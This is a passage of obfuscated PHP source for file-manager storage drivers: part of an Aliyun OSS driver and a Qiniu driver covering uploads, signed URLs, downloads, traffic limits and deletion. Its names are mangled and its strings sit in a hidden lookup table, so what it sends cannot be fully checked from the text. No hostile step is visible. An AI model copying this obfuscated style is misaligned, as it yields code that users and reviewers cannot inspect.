setContent($ÃÁ…½è¢, $şÑ¥îò› = '') { $´ò„´ğ =& $_SERVER[ÔÕ±ĞšÎ]; try { $¯øÚòëô = $this->trafficLimit($´ò„´ğ[1489]); $‚¼‡ñ¼Á = $this->client->putObject($this->bucket, $this->pathEncode($ÃÁ…½è¢), $şÑ¥îò›, $¯øÚòëô); } catch (OSS\Core\OssException $¬­†á¬) { $this->writeLog(__FUNCTION__ . $´ò„´ğ[214] . $¬­†á¬->getMessage()); return !1; } $–¨äÏèĞ = array($´ò„´ğ[1483] => trim($‚¼‡ñ¼Á[$´ò„´ğ[1480]], $´ò„´ğ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÃÁ…½è¢))); $this->updateObjMeta($ÃÁ…½è¢, $–¨äÏèĞ); return isset($‚¼‡ñ¼Á[$´ò„´ğ[1490]][$´ò„´ğ[296]]) ? !0 : !1; } private function updateObjMeta($ Ä ş´ï, $Ì‰•áàâ) { $ Ä ş´ï = $this->pathEncode($ Ä ş´ï); try { $ÙÕÆŞì = array(OSS\OssClient::OSS_HEADERS => $Ì‰•áàâ); $this->client->copyObject($this->bucket, $ Ä ş´ï, $this->bucket, $ Ä ş´ï, $ÙÕÆŞì); } catch (OSS\Core\OssException $Óø¿÷ñş) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][214] . $Óø¿÷ñş->getMessage()); return !1; } return !0; } public function upload($Œšø’ö÷, $‚œ¬à´ç, $úü²‰Éï = false, $ï›ê‚×£ = REPEAT_REPLACE) { $’¿İ‘•¯ =& $_SERVER[ÔÕ±ĞšÎ]; $¼Í®Èü­ = trim($Œšø’ö÷, $’¿İ‘•¯[8]); $¢ò…€¬Ñ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($’¿İ‘•¯[1483] => @md5_file($‚œ¬à´ç)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Œšø’ö÷))); $¢ò…€¬Ñ = $this->trafficLimit($’¿İ‘•¯[1489], $¢ò…€¬Ñ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¼Í®Èü­), $‚œ¬à´ç, $¢ò…€¬Ñ); } catch (OSS\Core\OssException $ßûÙü£) { $this->writeLog(__FUNCTION__ . $’¿İ‘•¯[214] . $ßûÙü£->getMessage()); return !1; } return $this->getPathOuter($Œšø’ö÷); } public function getHost() { $òáÊ›˜Ì =& $_SERVER[ÔÕ±ĞšÎ]; $û¿‘ı€’ = explode($òáÊ›˜Ì[210], parent::getHost()); return $û¿‘ı€’[0] . $òáÊ›˜Ì[210] . $this->bucket . $òáÊ›˜Ì[10] . $û¿‘ı€’[1]; } public function uploadFormData($şˆ»Îç, $§ıÇã«Ç = 3600) { $ˆâ“ÏÔ =& $_SERVER[ÔÕ±ĞšÎ]; if (!($¯¨ëÒşä = $this->getHost())) { return !1; } $ó¸® Îæ = $§ıÇã«Ç; $©ï§¤ö = date($ˆâ“ÏÔ[1491], time() + $ó¸® Îæ); $İÇÚ¡Ë = new DateTime($©ï§¤ö); $­¥ƒÎÉ– = $İÇÚ¡Ë->format(DateTime::ISO8601); $¸³¬çÁ = strpos($­¥ƒÎÉ–, $ˆâ“ÏÔ[373]); $­¥ƒÎÉ– = substr($­¥ƒÎÉ–, 0, $¸³¬çÁ) . $ˆâ“ÏÔ[1492]; $äú·ñ»÷ = 1048576000 * 5; $ŒÃ¥¢€ô = $this->pathFather($şˆ»Îç); $ê‚Û¦â = array($ˆâ“ÏÔ[264] => $­¥ƒÎÉ–, $ˆâ“ÏÔ[267] => array(array($ˆâ“ÏÔ[1493], 0, $äú·ñ»÷), array($ˆâ“ÏÔ[269], $ˆâ“ÏÔ[270], $ŒÃ¥¢€ô))); $ëçáí¸û = base64_encode(json_encode($ê‚Û¦â)); $õ™¸˜ü¼ = base64_encode(hash_hmac($ˆâ“ÏÔ[1414], $ëçáí¸û, $this->secret, !0)); $†µ­µŒè = array($ˆâ“ÏÔ[1494] => $this->accessKey, $ˆâ“ÏÔ[279] => $ëçáí¸û, $ˆâ“ÏÔ[272] => $ˆâ“ÏÔ[263], $ˆâ“ÏÔ[1495] => $õ™¸˜ü¼, $ˆâ“ÏÔ[208] => $¯¨ëÒşä); $†µ­µŒè = $this->trafficLimit($ˆâ“ÏÔ[1489], $†µ­µŒè, !0); return $†µ­µŒè; } public function uploadMultiData($Úë¸˜¦, $¶·¡è§õ = 3600) { $ÜÚ‘šƒ =& $_SERVER[ÔÕ±ĞšÎ]; if (!($¶˜’¿’ì = $this->getHost())) { return !1; } $ÏÀïšúÏ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Úë¸˜¦)); return array($ÜÚ‘šƒ[283] => $ÏÀïšúÏ, $ÜÚ‘šƒ[208] => $¶˜’¿’ì . $ÜÚ‘šƒ[8] . $this->pathEncode($Úë¸˜¦), $ÜÚ‘šƒ[284] => gmdate($ÜÚ‘šƒ[1496]), $ÜÚ‘šƒ[97] => $Úë¸˜¦); } public function uploadMultiAuth($Şñ†î, $ê©«öñŸ = array()) { if (isset($ê©«öñŸ[$_SERVER[ÔÕ±ĞšÎ][285]])) { return $this->uploadPartAuth($Şñ†î, $ê©«öñŸ); } return $this->uploadListAuth($Şñ†î, $ê©«öñŸ); } private function uploadPartAuth($¸¡×Ş”, $ÏÆı³ÃÁ = array()) { $æËƒ¾ú =& $_SERVER[ÔÕ±ĞšÎ]; $ãÊè“ıÙ = $ÏÆı³ÃÁ[$æËƒ¾ú[97]]; $‹˜·‘ßÌ = $this->_getUploadAuth($ãÊè“ıÙ, $ÏÆı³ÃÁ); $Û¦‚èˆ„ = array($æËƒ¾ú[288] => $‹˜·‘ßÌ[$æËƒ¾ú[288]], $æËƒ¾ú[284] => $‹˜·‘ßÌ[$æËƒ¾ú[284]]); if (isset($‹˜·‘ßÌ[$æËƒ¾ú[1497]])) { $Û¦‚èˆ„[$æËƒ¾ú[1497]] = $‹˜·‘ßÌ[$æËƒ¾ú[1497]]; } return $Û¦‚èˆ„; } private function uploadListAuth($ğ·ãÒğü, $áÉçĞİ¦ = array()) { $…ÏßËû« =& $_SERVER[ÔÕ±ĞšÎ]; $°ÊŸÜß¯ = $áÉçĞİ¦[$…ÏßËû«[97]]; $ÉÂÕÏßÍ = $áÉçĞİ¦[$…ÏßËû«[283]]; $¸·ıªÕØ = $this->client->listParts($this->bucket, $this->pathEncode($°ÊŸÜß¯), $ÉÂÕÏßÍ); $äœÒ­–¶ = $¸·ıªÕØ->getListPart(); $ÉŒö—²¹ = array(); foreach ($äœÒ­–¶ as $ûÙàÃ») { $ÉŒö—²¹[] = array($…ÏßËû«[299] => $ûÙàÃ»->getPartNumber(), $…ÏßËû«[300] => trim($ûÙàÃ»->getETag(), $…ÏßËû«[121])); } if (!$ÉŒö—²¹) { return !1; } $‰ìÆ‰¶É = $this->_getUploadAuth($°ÊŸÜß¯, $áÉçĞİ¦); return array($…ÏßËû«[288] => $‰ìÆ‰¶É[$…ÏßËû«[288]], $…ÏßËû«[284] => $‰ìÆ‰¶É[$…ÏßËû«[284]], $…ÏßËû«[291] => $ÉŒö—²¹); } private function _getUploadAuth($Ì–ÆÙ, $ŒŸ¬”òë) { $òÂ‹Ì‘± =& $_SERVER[ÔÕ±ĞšÎ]; $ô÷‚åç = gmdate($òÂ‹Ì‘±[1496]); $ı‚½¿õ = isset($ŒŸ¬”òë[$òÂ‹Ì‘±[285]]) ? $òÂ‹Ì‘±[255] : $òÂ‹Ì‘±[290]; $ÙÖ¯ˆ° = array_intersect_key($ŒŸ¬”òë, array_flip(array($òÂ‹Ì‘±[285], $òÂ‹Ì‘±[283]))); ksort($ÙÖ¯ˆ°); $ÏêÆœˆ° = $ÙÖ¯ˆ° ? $òÂ‹Ì‘±[76] . http_build_query($ÙÖ¯ˆ°, null, $òÂ‹Ì‘±[286], PHP_QUERY_RFC3986) : $òÂ‹Ì‘±[12]; $š”Å„İ¾ = array($ı‚½¿õ, $òÂ‹Ì‘±[12], $òÂ‹Ì‘±[123], $ô÷‚åç, "\x78\x2d\157\x73\163\x2d\x64\141\x74\145\72{$ô÷‚åç}", $òÂ‹Ì‘±[8] . $this->bucket . $òÂ‹Ì‘±[8] . $Ì–ÆÙ . $ÏêÆœˆ°); if (isset($ŒŸ¬”òë[$òÂ‹Ì‘±[285]])) { $±©‘š·Ö = $this->trafficLimit($òÂ‹Ì‘±[1489], array(), !0); if ($±©‘š·Ö) { $Ì–ÆÙ = $òÂ‹Ì‘±[1497]; array_splice($š”Å„İ¾, 5, 0, $Ì–ÆÙ . $òÂ‹Ì‘±[4] . $±©‘š·Ö[$Ì–ÆÙ]); } } $Ë¬›ıà = implode($òÂ‹Ì‘±[287], $š”Å„İ¾); $”šÈóóù = base64_encode(hash_hmac($òÂ‹Ì‘±[1414], $Ë¬›ıà, $this->secret, !0)); $Æ§²ÚÓ = $òÂ‹Ì‘±[1466] . $this->accessKey . $òÂ‹Ì‘±[4] . $”šÈóóù; $†”î½Ùù = array($òÂ‹Ì‘±[288] => $Æ§²ÚÓ, $òÂ‹Ì‘±[284] => $ô÷‚åç); if (!empty($±©‘š·Ö)) { $†”î½Ùù = array_merge($†”î½Ùù, $±©‘š·Ö); } return $†”î½Ùù; } public function download($ª €ğé, $å­Çî™) { $¢×¬ôÅ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->isFolder($ª €ğé)) { return !1; } try { $¼¼·ßá = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $å­Çî™); $¼¼·ßá = $this->trafficLimit($¢×¬ôÅ[112], $¼¼·ßá); $this->client->getObject($this->bucket, $this->pathEncode($ª €ğé), $¼¼·ßá); } catch (OSS\Core\OssException $˜¶”¸Ğ ) { $this->writeLog(__FUNCTION__ . $¢×¬ôÅ[214] . $˜¶”¸Ğ ->getMessage()); return !1; } return $å­Çî™; } public function fileSubstr($Ş¼ôÎ, $Í§¼°»ı = 0, $ Œ—Öï = false) { if ($Í§¼°»ı === -1) { $„¸Â¿´¾ = array(); } else { if ($ Œ—Öï === !1) { $¡íÒ³·Æ = $this->size($Ş¼ôÎ); } else { $¡íÒ³·Æ = $Í§¼°»ı + $ Œ—Öï - 1; } $„¸Â¿´¾ = array(OSS\OssClient::OSS_RANGE => "{$Í§¼°»ı}\55{$¡íÒ³·Æ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ş¼ôÎ), $„¸Â¿´¾); } catch (OSS\Core\OssException $Àáó‹û‡) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][214] . $Àáó‹û‡->getMessage()); think_exception($Àáó‹û‡->getMessage()); return !1; } } private function trafficLimit($õ’ê‡°Ï, $ü¨ÓØ¡» = array(), $Õå±¾É¼ = false) { $ôò¬Øúµ =& $_SERVER[ÔÕ±ĞšÎ]; if ($õ’ê‡°Ï == $ôò¬Øúµ[1489] && $this->isUploadServer() || $õ’ê‡°Ï == $ôò¬Øúµ[112] && $this->isFileOutServer()) { return $ü¨ÓØ¡»; } $å’ö¨¨ı = floatval($GLOBALS[$ôò¬Øúµ[6]][$ôò¬Øúµ[92]][$ôò¬Øúµ[110]][$õ’ê‡°Ï]) * 1024 * 1024 * 8; if (!$å’ö¨¨ı) { return $ü¨ÓØ¡»; } $å’ö¨¨ı = $å’ö¨¨ı < 819200 ? 819200 : ($å’ö¨¨ı > 838860800 ? 838860800 : $å’ö¨¨ı); if ($Õå±¾É¼) { $ü¨ÓØ¡»[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($å’ö¨¨ı); } else { if (!isset($ü¨ÓØ¡»[OSS\OssClient::OSS_HEADERS])) { $ü¨ÓØ¡»[OSS\OssClient::OSS_HEADERS] = array(); } $ü¨ÓØ¡»[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($å’ö¨¨ı); } return $ü¨ÓØ¡»; } public function link($ĞÃ­ÍÔ, $Ü–Úê¬¢ = array()) { $Š‡Ğçñ™ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->exist($ĞÃ­ÍÔ) || $this->isFolder($ĞÃ­ÍÔ)) { return !1; } try { $Ü–Úê¬¢ = $this->trafficLimit($Š‡Ğçñ™[112], $Ü–Úê¬¢, !0); $€±ÌıùÎ = $this->client->signUrl($this->bucket, $this->pathEncode($ĞÃ­ÍÔ), 3600 * 12, $Š‡Ğçñ™[1498], $Ü–Úê¬¢); return $this->getCdnLink($€±ÌıùÎ); } catch (OSS\Core\OssException $‘©¯è™÷) { $this->writeLog(__FUNCTION__ . $Š‡Ğçñ™[214] . $‘©¯è™÷->getMessage()); return !1; } } public function fileOut($è¹Í‚˜š, $ïÉÎ°•ô = false, $ÂÖ½ãó‹ = false, $ãî¯µı = '') { $–¶áÓùÅ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->isFileOutServer()) { return $this->fileOutServer($è¹Í‚˜š, $ïÉÎ°•ô, $ÂÖ½ãó‹, $ãî¯µı); } if (!$ÂÖ½ãó‹) { $ÂÖ½ãó‹ = $this->pathThis($è¹Í‚˜š); } $ÂÖ½ãó‹ = rawurlencode($ÂÖ½ãó‹); $Äµ¹®§Ì = get_file_mime(get_path_ext($ÂÖ½ãó‹)); if ($Äµ¹®§Ì == $–¶áÓùÅ[250]) { return parent::fileOut($è¹Í‚˜š, $ïÉÎ°•ô, $ÂÖ½ãó‹, $ãî¯µı); } $ïÉÎ°•ô = $ïÉÎ°•ô ? $–¶áÓùÅ[1499] : $–¶áÓùÅ[1500]; $•Òµß£ô = array(OSS\OssClient::OSS_SUB_RESOURCE => $–¶áÓùÅ[1501] . rawurlencode("{$ïÉÎ°•ô}\73\146\x69\x6c\145\156\x61\155\145\75{$ÂÖ½ãó‹}")); $•Òµß£ô[OSS\OssClient::OSS_SUB_RESOURCE] .= $–¶áÓùÅ[1502] . rawurlencode($Äµ¹®§Ì); $ÀÔÅ£  = $this->link($è¹Í‚˜š, $•Òµß£ô); $this->fileOutLink($ÀÔÅ£ ); } public function fileOutServer($®ñ¼ÑŠ, $ØæÒçù  = false, $§ªÍã‰œ = false, $àÆ½œÁÌ = '') { parent::fileOut($®ñ¼ÑŠ, $ØæÒçù , $§ªÍã‰œ, $àÆ½œÁÌ); } public function fileOutImage($Ä”Ö÷², $‘â ¸÷û = 250) { if ($this->size($Ä”Ö÷²) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ä”Ö÷², $‘â ¸÷û); } $Â¥ÁĞ¼º = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÔÕ±ĞšÎ][1463] . $‘â ¸÷û); $ªï¬´Ğ‚ = $this->link($Ä”Ö÷², $Â¥ÁĞ¼º); $this->fileOutLink($ªï¬´Ğ‚); } public function fileOutImageServer($Ğ£Ã­şŸ, $İºÜ€ = 250) { parent::fileOutImage($Ğ£Ã­şŸ, $İºÜ€); } public function fileOutLink($ÉüÅÈèö) { $ÚÔ·™â¯ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->isCdnHost() && substr($ÉüÅÈèö, 0, 7) == $ÚÔ·™â¯[218]) { $ÉüÅÈèö = $ÚÔ·™â¯[219] . substr($ÉüÅÈèö, 7); } header($ÚÔ·™â¯[175] . $ÉüÅÈèö); die; } public function hashMd5($Å‚¥ı¯, $—ºïü‘Ç = '') { $¡‰¹œû‹ =& $_SERVER[ÔÕ±ĞšÎ]; $òŒëíâñ = $this->_objectMeta($Å‚¥ı¯); if (!$òŒëíâñ) { return $¡‰¹œû‹[12]; } if (!isset($òŒëíâñ[$¡‰¹œû‹[1483]]) && !empty($—ºïü‘Ç)) { $ßç¢ˆ¹Ã = $this->updateObjMeta($Å‚¥ı¯, array($¡‰¹œû‹[1483] => $—ºïü‘Ç)); $òŒëíâñ[$¡‰¹œû‹[1483]] = $ßç¢ˆ¹Ã ? $—ºïü‘Ç : $¡‰¹œû‹[12]; } return isset($òŒëíâñ[$¡‰¹œû‹[1483]]) ? strtolower($òŒëíâñ[$¡‰¹œû‹[1483]]) : $¡‰¹œû‹[12]; } public function size($±Å˜å«Á) { $Õ²„èË = $this->objectMeta($±Å˜å«Á); return $Õ²„èË ? $Õ²„èË[$_SERVER[ÔÕ±ĞšÎ][79]] : 0; } public function info($ø³¶Úöæ) { if ($this->isFolder($ø³¶Úöæ)) { return $this->folderInfo($ø³¶Úöæ); } else { if ($this->isFile($ø³¶Úöæ)) { return $this->fileInfo($ø³¶Úöæ); } } return !1; } public function exist($äû«øœ‹) { return $this->isFile($äû«øœ‹) || $this->isFolder($äû«øœ‹); } public function isFile($Ùı¼˜ƒ‚) { return !$this->isFolder($Ùı¼˜ƒ‚) && $this->objectMeta($Ùı¼˜ƒ‚); } public function isFolder($¡…¸´†) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][179], $¡…¸´†); } protected function objectMeta($øØêÄöİ) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][181], $øØêÄöİ); } protected function _objectMeta($Ñ‹ÌÅ¸) { $¥ØÚ‹ãû =& $_SERVER[ÔÕ±ĞšÎ]; try { $ìÁÀâ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ñ‹ÌÅ¸)); } catch (OSS\Core\OssException $šèñİÊÕ) { $this->writeLog(__FUNCTION__ . $¥ØÚ‹ãû[214] . $šèñİÊÕ->getMessage()); $ìÁÀâ = !1; } if ($ìÁÀâ) { $ìÁÀâ[$¥ØÚ‹ãû[79]] = intval($ìÁÀâ[$¥ØÚ‹ãû[1481]]); } return $ìÁÀâ; } protected function _isFolder($âÍÆ„½) { $ÕÙØ–ÔŠ =& $_SERVER[ÔÕ±ĞšÎ]; if ($âÍÆ„½ == $ÕÙØ–ÔŠ[12] || $âÍÆ„½ == $ÕÙØ–ÔŠ[8]) { return !0; } $şÀşˆ¬œ = array($ÕÙØ–ÔŠ[1476] => $ÕÙØ–ÔŠ[8], $ÕÙØ–ÔŠ[1477] => rtrim($âÍÆ„½, $ÕÙØ–ÔŠ[8]) . $ÕÙØ–ÔŠ[8], $ÕÙØ–ÔŠ[1478] => 1, $ÕÙØ–ÔŠ[1479] => $ÕÙØ–ÔŠ[12]); $ıÖŠ°»  = $this->client->listObjects($this->bucket, $şÀşˆ¬œ); if ($ıÖŠ°» ->getObjectList() || $ıÖŠ°» ->getPrefixList()) { return !0; } return !1; } public function writeLog($ƒòñØ¥Á = '', $³øÛÕóò = false) { $Î‹æŒ”÷ =& $_SERVER[ÔÕ±ĞšÎ]; $öÄ È¬ = in_array(ACTION, array($Î‹æŒ”÷[212], $Î‹æŒ”÷[213])); if (!$öÄ È¬ && !GLOBAL_DEBUG) { return; } $Œ–Ú¯ = 0; if (stripos($ƒòñØ¥Á, $Î‹æŒ”÷[1503]) !== !1) { $Œ–Ú¯ = 1; $²ÊäÏíÚ = explode($Î‹æŒ”÷[1504], $ƒòñØ¥Á); $ƒòñØ¥Á = !empty($²ÊäÏíÚ[1]) ? $²ÊäÏíÚ[1] : $ƒòñØ¥Á; } else { if (stripos($ƒòñØ¥Á, $Î‹æŒ”÷[1505])) { $Œ–Ú¯ = 2; $²ÊäÏíÚ = explode($Î‹æŒ”÷[1505], $ƒòñØ¥Á); $²ÊäÏíÚ = explode($Î‹æŒ”÷[4], $²ÊäÏíÚ[0]); $ƒòñØ¥Á = !empty($²ÊäÏíÚ[1]) ? $²ÊäÏíÚ[1] : $ƒòñØ¥Á; } } if ($öÄ È¬ && I18n::getType() == $Î‹æŒ”÷[1506]) { if ($Œ–Ú¯ == 1) { $ƒòñØ¥Á = str_replace($Î‹æŒ”÷[1507], $Î‹æŒ”÷[1508], $ƒòñØ¥Á); } else { if ($Œ–Ú¯ == 2) { $²ÊäÏíÚ = explode($Î‹æŒ”÷[214], $²ÊäÏíÚ[0]); $¡šªÀçá = isset($²ÊäÏíÚ[1]) ? $²ÊäÏíÚ[1] : $Î‹æŒ”÷[12]; $’£ÊÚ¹ = array($Î‹æŒ”÷[1509] => $Î‹æŒ”÷[1510], $Î‹æŒ”÷[1511] => $Î‹æŒ”÷[1512], $Î‹æŒ”÷[1513] => $Î‹æŒ”÷[1514], $Î‹æŒ”÷[1515] => $Î‹æŒ”÷[1516], $Î‹æŒ”÷[1517] => $Î‹æŒ”÷[1518], $Î‹æŒ”÷[1519] => $Î‹æŒ”÷[1520], $Î‹æŒ”÷[1521] => $Î‹æŒ”÷[1522], $Î‹æŒ”÷[1523] => $Î‹æŒ”÷[1524], $Î‹æŒ”÷[1525] => $Î‹æŒ”÷[1526], $Î‹æŒ”÷[1527] => $Î‹æŒ”÷[1528]); if (isset($’£ÊÚ¹[$¡šªÀçá])) { $ƒòñØ¥Á = $’£ÊÚ¹[$¡šªÀçá]; } } } if (stripos($ƒòñØ¥Á, $Î‹æŒ”÷[1529])) { $ƒòñØ¥Á = $Î‹æŒ”÷[1530]; } } if (!trim($ƒòñØ¥Á)) { return; } parent::writeLog(trim($ƒòñØ¥Á), $³øÛÕóò); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ãòè§¡·) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÔÕ±ĞšÎ][1531]; $this->_init($ãòè§¡·); } public function _init($Û¬‹’ŞĞ) { $Ä‘Çšõ =& $_SERVER[ÔÕ±ĞšÎ]; $this->config = $Û¬‹’ŞĞ; foreach ($Û¬‹’ŞĞ as $‚ÍÓóŞÎ => $”àç°«î) { if (isset($this->{$‚ÍÓóŞÎ})) { $this->{$‚ÍÓóŞÎ} = $”àç°«î; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ä‘Çšõ[1532] . LNG($Ä‘Çšõ[1467])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($®ì­Œõò, $›ÄÒÜ = '', $ë¨¯ä‹¼ = REPEAT_RENAME) { if ($this->setContent($®ì­Œõò, $›ÄÒÜ)) { return $this->getPathOuter($®ì­Œõò); } return !1; } public function mkdir($·«±óıš, $‘’™•†Ø = REPEAT_SKIP) { $Úï¼æßÌ =& $_SERVER[ÔÕ±ĞšÎ]; $˜Àô«ôø = trim($·«±óıš, $Úï¼æßÌ[8]); if ($this->_isFolder($˜Àô«ôø)) { return $this->getPathOuter($˜Àô«ôø); } $·«±óıš = $˜Àô«ôø . $Úï¼æßÌ[8]; $ıÌÍ“Õ¤ = get_path_this($˜Àô«ôø); $‹Ô˜îŒ = $·«±óıš . $ıÌÍ“Õ¤; if (!$this->mkfile($‹Ô˜îŒ)) { return !1; } if (!$this->moveFile($‹Ô˜îŒ, $·«±óıš)) { $this->delFile($‹Ô˜îŒ); return !1; } return $this->getPathOuter($˜Àô«ôø); } public function copyFile($İ‡ùŒŞ, $ú¶’ùæ») { $ú½ï–Üõ = $this->bucketManager->copy($this->bucket, $İ‡ùŒŞ, $this->bucket, $ú¶’ùæ», !0); return $ú½ï–Üõ ? !1 : $this->getPathOuter($ú¶’ùæ»); } public function moveFile($¯»¼Ï£‘, $óÆ›±×Œ) { $óìÀ…ü = $this->bucketManager->move($this->bucket, $¯»¼Ï£‘, $this->bucket, $óÆ›±×Œ, !0); return $óìÀ…ü ? !1 : $this->getPathOuter($óÆ›±×Œ); } public function delFile($Æ¿ÇêßÅ) { if (!$this->exist($Æ¿ÇêßÅ)) { return !0; } $íÇ±µƒÂ = $this->bucketManager->delete($this->bucket, $Æ¿ÇêßÅ); if (!$íÇ±µƒÂ) { return !0; } return $íÇ±µƒÂ->code() == 612 ? !0 : !1; } public function delFolder($»ÊÔÍå) { $×±Üãê =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->exist($»ÊÔÍå)) { return !0; } $this->listItemCache = !1; $‡ªÈ‡ = $this->fileList($»ÊÔÍå); $this->listItemCache = !0; $“ÕÅÅçñ = trim($»ÊÔÍå, $×±Üãê[8]) . $×±Üãê[8]; if (!empty($»ÊÔÍå) && $»ÊÔÍå !== $×±Üãê[230] && !in_array($“ÕÅÅçñ, $‡ªÈ‡[$×±Üãê[85]])) { $‡ªÈ‡[$×±Üãê[85]][] = $“ÕÅÅçñ; } $“Õ‡ˆ¼ = $this->delByBatch($‡ªÈ‡[$×±Üãê[86]]); if (!$“Õ‡ˆ¼) { return !1; } $“Õ‡ˆ¼ = $this->delByBatch($‡ªÈ‡[$×±Üãê[85]]); if (!$“Õ‡ˆ¼) { return !1; } return $this->delFile($“ÕÅÅçñ); } private function delByBatch($Úõ°§İº) { foreach (array_chunk($Úõ°§İº, 1000) as $€ÜÍšÇ) { $Éèİ÷“Œ = $this->bucketManager->buildBatchDelete($this->bucket, $€ÜÍšÇ); list($®ÓÔõÌ², $–âäúÆ¶) = $this->bucketManager->batch($Éèİ÷“Œ); if ($–âäúÆ¶) { return !1; } } return !0; } public function rename($êÃŒßÚî, $ÎŞµ°²©) { return $this->renameObject($êÃŒßÚî, $ÎŞµ°²©); } public function fileInfo($åªøüä¥, $ÈĞâ€’ë = false, $â…¾Â‹Œ = array()) { $œïè·®… =& $_SERVER[ÔÕ±ĞšÎ]; $Áä—ı¡ó = array($œïè·®…[32] => $this->pathThis($åªøüä¥), $œïè·®…[87] => $this->getPathOuter($œïè·®…[8] . $åªøüä¥), $œïè·®…[33] => $œïè·®…[232], $œïè·®…[79] => isset($â…¾Â‹Œ[$œïè·®…[1533]]) ? $â…¾Â‹Œ[$œïè·®…[1533]] : 0, $œïè·®…[169] => $this->ext($åªøüä¥)); if ($ÈĞâ€’ë) { return $Áä—ı¡ó; } $Áä—ı¡ó[$œïè·®…[233]] = $Áä—ı¡ó[$œïè·®…[88]] = 0; $Áä—ı¡ó[$œïè·®…[234]] = $Áä—ı¡ó[$œïè·®…[235]] = !0; if (empty($â…¾Â‹Œ)) { $â…¾Â‹Œ = $this->objectMeta($åªøüä¥); if (!$â…¾Â‹Œ) { return $Áä—ı¡ó; } } if (isset($â…¾Â‹Œ[$œïè·®…[236]]) && $â…¾Â‹Œ[$œïè·®…[236]]) { $Áä—ı¡ó[$œïè·®…[237]] = $â…¾Â‹Œ[$œïè·®…[236]]; } if (isset($â…¾Â‹Œ[$œïè·®…[247]]) && $â…¾Â‹Œ[$œïè·®…[247]]) { $Áä—ı¡ó[$œïè·®…[237]] = $â…¾Â‹Œ[$œïè·®…[247]]; } if (isset($â…¾Â‹Œ[$œïè·®…[1534]])) { $Áä—ı¡ó[$œïè·®…[88]] = substr($â…¾Â‹Œ[$œïè·®…[1534]] . $œïè·®…[12], 0, 10); } if (isset($â…¾Â‹Œ[$œïè·®…[1533]])) { $Áä—ı¡ó[$œïè·®…[79]] = $â…¾Â‹Œ[$œïè·®…[1533]]; } return $Áä—ı¡ó; } public function folderInfo($çİ â¯, $›û³Ô± = false) { $ºÂÏùú¬ =& $_SERVER[ÔÕ±ĞšÎ]; $µò’·ğµ = array($ºÂÏùú¬[32] => $this->pathThis($çİ â¯), $ºÂÏùú¬[87] => $this->getPathOuter($ºÂÏùú¬[8] . $çİ â¯), $ºÂÏùú¬[33] => $ºÂÏùú¬[78]); if ($›û³Ô±) { return $µò’·ğµ; } $µò’·ğµ[$ºÂÏùú¬[233]] = $µò’·ğµ[$ºÂÏùú¬[88]] = 0; $µò’·ğµ[$ºÂÏùú¬[234]] = $µò’·ğµ[$ºÂÏùú¬[235]] = !0; $çİ â¯ = rtrim($çİ â¯, $ºÂÏùú¬[8]) . $ºÂÏùú¬[8]; $½û¡Ù×é = $this->objectMeta($çİ â¯); if (isset($½û¡Ù×é[$ºÂÏùú¬[1534]])) { $µò’·ğµ[$ºÂÏùú¬[88]] = substr($½û¡Ù×é[$ºÂÏùú¬[1534]] . $ºÂÏùú¬[12], 0, 10); } return $µò’·ğµ; } public function listPath($şÜÙñ¶, $ìß„™®š = false) { $¯ş­â‘Ñ =& $_SERVER[ÔÕ±ĞšÎ]; $³ø˜Š– = $this->fileList($şÜÙñ¶, $¯ş­â‘Ñ[8], !0); foreach ($³ø˜Š–[$¯ş­â‘Ñ[85]] as $Ùîñ¸êÅ => $½éÇª˜…) { $³ø˜Š–[$¯ş­â‘Ñ[85]][$Ùîñ¸êÅ] = $this->folderInfo($½éÇª˜…, $ìß„™®š); } foreach ($³ø˜Š–[$¯ş­â‘Ñ[86]] as $Ùîñ¸êÅ => $½éÇª˜…) { $³ø˜Š–[$¯ş­â‘Ñ[86]][$Ùîñ¸êÅ] = $this->fileInfo($½éÇª˜…[$¯ş­â‘Ñ[97]], $ìß„™®š, $½éÇª˜…); } return $³ø˜Š–; } public function has($İûğ·Ì‡, $Ã¢«½œå = false, $‚İç‡Ï“ = true) { $¤­Öª–É =& $_SERVER[ÔÕ±ĞšÎ]; $İûğ·Ì‡ = trim($İûğ·Ì‡, $¤­Öª–É[8]); $ªÒÙ›° = empty($İûğ·Ì‡) && $İûğ·Ì‡ !== $¤­Öª–É[230] ? $¤­Öª–É[12] : $İûğ·Ì‡ . $¤­Öª–É[8]; $ª³Ó³Şû = $¤­Öª–É[12]; $ŒŞÂßÅ¢ = 500; $ê–ê„½Á = $¤­Öª–É[8]; $±³£ÎÎ• = $¬’üäª» = 0; while (!0) { check_abort(); 